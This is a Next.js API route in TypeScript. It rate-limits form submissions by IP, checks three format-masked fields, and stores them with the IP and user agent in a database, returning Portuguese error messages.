import { NextRequest, NextResponse } from "next/server";
import { sql, getConfig } from "@/lib/db";
import { checkRateLimit } from "@/lib/ratelimit";
import { isComplete } from "@/lib/mask";

function getClientIp(req: NextRequest) {
  const fwd = req.headers.get("x-forwarded-for");
  if (fwd) return fwd.split(",")[0].trim();
  return req.headers.get("x-real-ip") || "unknown";
}

export async function POST(req: NextRequest) {
  try {
    const config = await getConfig();
    const ip = getClientIp(req);

    const { allowed } = await checkRateLimit(
      ip,
      config.rate_limit_max,
      config.rate_limit_window_seconds
    );

    if (!allowed) {
      return NextResponse.json(
        { error: "Muitas tentativas. Aguarde um pouco e tente novamente." },
        { status: 429 }
      );
    }

    const body = await req.json();
    const field1 = String(body.field1 ?? "");
    const field2 = String(body.field2 ?? "");
    const field3 = String(body.field3 ?? "");

    if (
      !isComplete(field1, config.field1_format) ||
      !isComplete(field2, config.field2_format) ||
      !isComplete(field3, config.field3_format)
    ) {
      return NextResponse.json(
        { error: "Preencha todos os campos corretamente." },
        { status: 400 }
      );
    }

    await sql`
      INSERT INTO submissions (field1_value, field2_value, field3_value, ip, user_agent)
      VALUES (${field1}, ${field2}, ${field3}, ${ip}, ${req.headers.get("user-agent") || ""});
    `;

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error(err);
    return NextResponse.json(
      { error: "Erro ao processar o envio." },
      { status: 500 }
    );
  }
}
